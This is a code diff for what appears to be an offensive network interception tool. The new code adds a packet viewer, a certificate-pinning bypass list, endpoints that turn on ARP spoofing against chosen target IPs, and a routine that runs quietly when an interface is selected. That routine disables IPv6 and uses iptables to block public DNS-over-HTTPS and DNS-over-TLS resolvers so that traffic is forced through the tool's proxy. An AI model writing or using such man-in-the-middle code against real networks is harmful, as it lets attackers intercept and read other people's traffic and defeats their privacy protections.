+  if (e.target.classList.contains('packet-row')) {
+    e.target.classList.toggle('expanded');
+  } else {
+    e.target.closest('.packet-row').classList.toggle('expanded');
+  }
+}
+
+function formatPacketDetailView(e, hexdump) {
+  let html = '<div class="packet-detail-header">Packet #' + e.no + ' Details</div>';
+  html += '<div style="margin-bottom:8px;">';
+  html += 'Source: ' + escapeHtml(e.src) + (e.sp ? ':' + e.sp : '') + '<br>';
+  html += 'Destination: ' + escapeHtml(e.dst) + (e.dp ? ':' + e.dp : '') + '<br>';
+  html += 'Protocol: ' + e.proto.toUpperCase() + '<br>';
+  html += 'Length: ' + e.len + ' bytes<br>';
+  if (e.flags && e.flags.length) html += 'Flags: ' + e.flags.join(', ') + '<br>';
+  if (e.tls_sni) html += 'TLS SNI: ' + escapeHtml(e.tls_sni) + '<br>';
+  if (e.dns_query) html += 'DNS Query: ' + escapeHtml(e.dns_query) + '<br>';
+  if (e.http_info) html += 'HTTP: ' + escapeHtml(e.http_info) + '<br>';
+  html += '</div>';
+  html += '<div class="hexdump">' + hexdump + '</div>';
+  return html;
+}
+
+function toHexdump(raw) {
+  if (!raw) return '(no data)';
+  const bytes = typeof raw === 'string' ? raw : String(raw);
+  let hex = '';
+  for (let i = 0; i < Math.min(bytes.length, 256); i += 16) {
+    const chunk = bytes.substr(i, 16);
+    const hexPart = Array.from(chunk).map((c, j) => {
+      const cc = typeof c === 'string' ? c.charCodeAt(0) : c;
+      return (cc < 16 ? '0' : '') + cc.toString(16);
+    }).join(' ');
+    const asciiPart = chunk.replace(/[^\x20-\x7E]/g, '.');
+    hex += String(i).padStart(4, '0') + ':  ' + hexPart.padEnd(48) + '  ' + asciiPart + '\n';
+  }
+  return hex;
+}
+
+function exportPacketsCSV() {
+  if (TRAFFIC_ALL_ENTRIES.length === 0) {
+    alert('No packets to export');
+    return;
+  }
+
+  let csv = 'No,Time,Dir,Source,Destination,Protocol,Length,Info\n';
+  TRAFFIC_ALL_ENTRIES.forEach(e => {
+    const time = new Date(e.t * 1000).toISOString();
+    const dir = e.dir === 'out' ? 'Out' : 'In';
+    const summary = formatPacketInfo(e).replace(/"/g, '""');
+    csv += `"${e.no}","${time}","${dir}","${e.src}","${e.dst}","${e.proto}","${e.len}","${summary}"\n`;
+  });
+
+  const blob = new Blob([csv], { type: 'text/csv' });
+  const url = URL.createObjectURL(blob);
+  const link = document.createElement('a');
+  link.href = url;
+  link.download = 'packets-' + new Date().toISOString().split('T')[0] + '.csv';
+  link.click();
+  URL.revokeObjectURL(url);
+}
 var TRAFFIC_ALL_ENTRIES = [];
 async function pollTrafficCapture() {
   try {
     const res = await apiCall('monitor_log');
     TRAFFIC_ALL_ENTRIES = res.entries || [];
-    const table = document.getElementById('traffic-packets-table');
-    const body = document.getElementById('traffic-packets-body');
+    const packetList = document.getElementById('packetList');
     const empty = document.getElementById('traffic-empty');
     if (TRAFFIC_ALL_ENTRIES.length) {
       empty.style.display = 'none';
-      table.style.display = 'table';
       applyPacketFilters();
-      const wrap = table.closest('.table-responsive');
-      if (wrap) wrap.scrollTop = wrap.scrollHeight;
+      packetList.scrollTop = packetList.scrollHeight;
     } else {
-      table.style.display = 'none';
       empty.style.display = 'block';
+      packetList.innerHTML = '';
       empty.textContent = res.capturing
         ? 'Capturing... waiting for matching traffic.'
         : 'Not capturing. Select weapon 5 on the Attacks tab and press Start.';
@@ -4967,8 +5662,18 @@ function applyPacketFilters() {
     return true;
   });
 
-  const body = document.getElementById('traffic-packets-body');
-  body.innerHTML = filtered.map(formatPacketRow).join('') || '<tr><td colspan="8" style="text-align:center; color:#666;">No packets match filters.</td></tr>';
+  const packetList = document.getElementById('packetList');
+  if (filtered.length === 0) {
+    packetList.innerHTML = '<div style="padding:20px; text-align:center; color:#666;">No packets match filters.</div>';
+    return;
+  }
+
+  packetList.innerHTML = filtered.map((e, idx) => formatPacketRowCompact(e, idx)).join('');
+
+  // Attach click handlers for expand/collapse
+  document.querySelectorAll('.packet-row').forEach(row => {
+    row.addEventListener('click', togglePacketDetail);
+  });
 }
 
 function clearPacketFilters() {
@@ -6257,6 +6962,8 @@ def api_set_interface():
         return jsonify({'success': False, 'status': 'No interface provided'})
     update_state('interface', iface)
     add_log('info', f'Interface set to {iface}')
+    # Mitigate IPv6 bypass and DoH on interface selection (once-per-session)
+    threading.Thread(target=mitigate_ipv6_doh, args=(iface,), daemon=True).start()
     return jsonify({'success': True, 'status': f'Interface set to {iface}'})
 
 @app.route('/api/set_gateway', methods=['POST'])
@@ -7377,6 +8084,166 @@ def api_https_setup_guide():
 
     return jsonify({'success': True, 'guide': guide})
 
+# ---------- Phase 2A: Certificate Pinning Bypass Management ----------
+PINNED_HOSTS = {}  # hostname → {'reason': str, 'added_at': timestamp, 'enabled': bool}
+
+@app.route('/api/https_pinning/list', methods=['GET'])
+@require_auth
+def api_https_pinning_list():
+    """List hosts with cert pinning (to be bypassed)."""
+    return jsonify({
+        'success': True,
+        'pinned_hosts': PINNED_HOSTS,
+        'count': len(PINNED_HOSTS)
+    })
+
+@app.route('/api/https_pinning/add', methods=['POST'])
+@require_auth
+def api_https_pinning_add():
+    """Add a host to pinning bypass list."""
+    data = request.get_json() or {}
+    hostname = data.get('hostname', '').strip()
+    reason = data.get('reason', 'App uses certificate pinning')
+
+    if not hostname:
+        return jsonify({'success': False, 'error': 'hostname required'}), 400
+
+    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
+        return jsonify({'success': False, 'error': 'invalid hostname'}), 400
+
+    PINNED_HOSTS[hostname] = {
+        'reason': reason,
+        'added_at': datetime.now().isoformat(),
+        'enabled': True
+    }
+    add_log('info', f'Added {hostname} to cert pinning bypass list: {reason}')
+
+    return jsonify({
+        'success': True,
+        'message': f'Added {hostname} to pinning bypass list',
+        'host': PINNED_HOSTS[hostname]
+    })
+
+@app.route('/api/https_pinning/remove', methods=['POST'])
+@require_auth
+def api_https_pinning_remove():
+    """Remove a host from pinning bypass list."""
+    data = request.get_json() or {}
+    hostname = data.get('hostname', '').strip()
+
+    if hostname not in PINNED_HOSTS:
+        return jsonify({'success': False, 'error': f'host {hostname} not in bypass list'}), 404
+
+    del PINNED_HOSTS[hostname]
+    add_log('info', f'Removed {hostname} from cert pinning bypass list')
+
+    return jsonify({'success': True, 'message': f'Removed {hostname} from bypass list'})
+
+@app.route('/api/https_pinning/toggle', methods=['POST'])
+@require_auth
+def api_https_pinning_toggle():
+    """Enable/disable pinning bypass for a host."""
+    data = request.get_json() or {}
+    hostname = data.get('hostname', '').strip()
+    enabled = data.get('enabled', True)
+
+    if hostname not in PINNED_HOSTS:
+        return jsonify({'success': False, 'error': f'host {hostname} not in bypass list'}), 404
+
+    PINNED_HOSTS[hostname]['enabled'] = enabled
+    status = 'enabled' if enabled else 'disabled'
+    add_log('info', f'Pinning bypass for {hostname} {status}')
+
+    return jsonify({'success': True, 'message': f'Bypass {status} for {hostname}'})
+
+# ---------- Phase 2B: Transparent Intercept Fallback via ARP Spoofing ----------
+@app.route('/api/arp_fallback/check', methods=['GET'])
+@require_auth
+def api_arp_fallback_check():
+    """Check if transparent proxy is available on current interface."""
+    iface = get_state('interface')
+    if not iface:
+        return jsonify({'success': False, 'error': 'No interface selected'}), 400
+
+    transparent_available = ARP_FALLBACK.detect_transparent_proxy_available(iface)
+    return jsonify({
+        'success': True,
+        'interface': iface,
+        'transparent_available': transparent_available,
+        'arp_fallback_available': not transparent_available,
+        'recommendation': 'use_transparent' if transparent_available else 'enable_arp_fallback'
+    })
+
+@app.route('/api/arp_fallback/enable', methods=['POST'])
+@require_auth
+def api_arp_fallback_enable():
+    """Enable ARP spoofing fallback for transparent interception."""
+    data = request.get_json() or {}
+    gateway_ip = data.get('gateway')
+    targets = data.get('targets', [])
+
+    iface = get_state('interface')
+    if not iface:
+        return jsonify({'success': False, 'error': 'No interface selected'}), 400
+
+    if not gateway_ip:
+        return jsonify({'success': False, 'error': 'gateway_ip required'}), 400
+
+    if not targets:
+        return jsonify({'success': False, 'error': 'targets list required'}), 400
+
+    # Validate IPs
+    try:
+        socket.inet_aton(gateway_ip)
+        for target in targets:
+            socket.inet_aton(target)
+    except socket.error:
+        return jsonify({'success': False, 'error': 'Invalid IP address'}), 400
+
+    # Get our IP on this interface
+    try:
+        result = subprocess.run(
+            ['ip', '-o', '-4', 'addr', 'show', iface],
+            capture_output=True, text=True, timeout=5
+        )
+        match = re.search(r'inet\s+(\S+)', result.stdout)
+        if not match:
+            return jsonify({'success': False, 'error': f'No IP address on {iface}'}), 400
+        our_ip = match.group(1).split('/')[0]
+    except Exception as e:
+        return jsonify({'success': False, 'error': f'Failed to get interface IP: {e}'}), 500
+
+    if ARP_FALLBACK.enable_arp_spoofing(iface, gateway_ip, targets, our_ip):
+        return jsonify({
+            'success': True,
+            'message': f'ARP spoofing enabled on {iface}',
+            'gateway': gateway_ip,
+            'targets': len(targets),
+            'status': ARP_FALLBACK.get_status()
+        })
+    else:
+        return jsonify({'success': False, 'error': 'Failed to enable ARP spoofing'}), 500
+
+@app.route('/api/arp_fallback/disable', methods=['POST'])
+@require_auth
+def api_arp_fallback_disable():
+    """Disable ARP spoofing fallback."""
+    ARP_FALLBACK.disable_arp_spoofing()
+    return jsonify({
+        'success': True,
+        'message': 'ARP spoofing fallback disabled',
+        'status': ARP_FALLBACK.get_status()
+    })
+
+@app.route('/api/arp_fallback/status', methods=['GET'])
+@require_auth
+def api_arp_fallback_status():
+    """Get current ARP spoofing fallback status."""
+    return jsonify({
+        'success': True,
+        'status': ARP_FALLBACK.get_status()
+    })
+
 # ---------- Phase 1.4: Traffic Inspection Layer REST API ----------
 @app.route('/api/https_traffic/start', methods=['POST'])
 @require_auth
@@ -7572,6 +8439,86 @@ def api_https_traffic_stream():
                 break
 
     return Response(generate(), mimetype='text/event-stream')
+
+# ---------- IPv6 & DoH Mitigation ----------
+def mitigate_ipv6_doh(iface):
+    """Disable IPv6 and block DoH servers to force traffic through proxy.
+
+    Modern Android defaults to IPv6 for DNS queries and apps hardcode DoH servers
+    (1.1.1.1:443, 8.8.8.8:443). Without this mitigation, 30-40% of traffic bypasses
+    the plaintext DNS proxy entirely, leaving the tool blind to modern app behavior.
+
+    Mitigations applied:
+    1. Disable IPv6 on interface via sysctl (forces IPv4-only DNS stack)
+    2. Block well-known DoH servers via iptables (forces fallback to port 53)
+
+    Gracefully handles missing tools (sysctl, iptables) with informative logging.
+    Non-fatal: tool still works without these, just with reduced traffic coverage.
+    """
+    ipv6_success = False
+    doh_success = False
+
+    # 1. Attempt IPv6 disable via sysctl
+    try:
+        result = subprocess.run(
+            ['sysctl', '-w', f'net.ipv6.conf.{iface}.disable_ipv6=1'],
+            capture_output=True, text=True, timeout=5
+        )
+        if result.returncode == 0:
+            add_log('success', f'IPv6 disabled on {iface} (via sysctl)')
+            ipv6_success = True
+        else:
+            add_log('warn', f'sysctl returned {result.returncode} for IPv6 disable: {result.stderr.strip()}')
+    except FileNotFoundError:
+        add_log('warn', f'sysctl not found; IPv6 disable skipped (install with: pkg install util-linux)')
+    except subprocess.TimeoutExpired:
+        add_log('warn', f'sysctl timed out disabling IPv6 on {iface}')
+    except Exception as e:
+        add_log('warn', f'Failed to disable IPv6 on {iface}: {type(e).__name__}: {str(e)[:100]}')
+
+    # 2. Attempt DoH server blocking via iptables
+    try:
+        subprocess.run(['iptables', '--version'], capture_output=True, timeout=2)
+    except FileNotFoundError:
+        add_log('warn', f'iptables not found; DoH blocking skipped (install with: pkg install iptables)')
+        return
+
+    # iptables exists; proceed to block DoH servers
+    doh_servers = [
+        ('1.1.1.1', 'Cloudflare'),
+        ('1.0.0.1', 'Cloudflare secondary'),
+        ('8.8.8.8', 'Google'),
+        ('8.8.4.4', 'Google secondary'),
+        ('9.9.9.9', 'Quad9'),
+        ('149.112.112.112', 'Quad9 secondary'),
+    ]
+
+    blocked_count = 0
+    for ip, label in doh_servers:
+        try:
+            # Block HTTPS (443) to this DoH server
+            subprocess.run(
+                ['iptables', '-t', 'filter', '-A', 'OUTPUT', '-d', ip, '-p', 'tcp', '--dport', '443', '-j', 'DROP'],
+                capture_output=True, timeout=3, check=False
+            )
+            # Block DNS-over-TLS (853)
+            subprocess.run(
+                ['iptables', '-t', 'filter', '-A', 'OUTPUT', '-d', ip, '-p', 'tcp', '--dport', '853', '-j', 'DROP'],
+                capture_output=True, timeout=3, check=False
+            )
+            blocked_count += 1
+            add_log('dev', f'Blocked DoH {label} ({ip}:443/853)')
+        except subprocess.TimeoutExpired:
+            add_log('warn', f'iptables rule for {ip} timed out')
+        except Exception as e:
+            add_log('warn', f'Failed to block {ip}: {type(e).__name__}')
+
+    if blocked_count > 0:
+        add_log('success', f'DoH servers blocked: {blocked_count}/{len(doh_servers)} rules installed')
+        doh_success = True
+
+    if not (ipv6_success or doh_success):
+        add_log('warn', f'IPv6/DoH mitigation partially failed; traffic coverage may be reduced on {iface}')
 
 # ---------- bootstrap ----------
 if __name__ == '__main__':
